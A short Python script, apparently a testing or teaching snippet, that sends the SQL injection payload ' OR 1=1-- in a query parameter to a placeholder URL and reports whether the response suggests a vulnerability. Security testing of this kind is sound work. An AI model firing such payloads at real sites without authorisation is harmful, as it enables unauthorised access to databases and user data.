import requests

def test_sql_injection(url):
    # Example payload for SQL Injection
    payload = "' OR 1=1--"
    # The payload here attempts to make the query always return true, by injecting SQL code that ends the original query and then comments out any remaining code.

    # Sending a GET request with the payload
    response = requests.get(url + f"?id={payload}")

    # Check if the response indicates a successful injection
    if "User details" in response.text:
        print(f"SQL Injection vulnerability found in {url}")
    else:
        print(f"No SQL Injection vulnerability found in {url}")

def main():
    target_url = "https://example.com/vulnerable_endpoint"
    test_sql_injection(target_url)

if __name__ == "__main__":
    main()
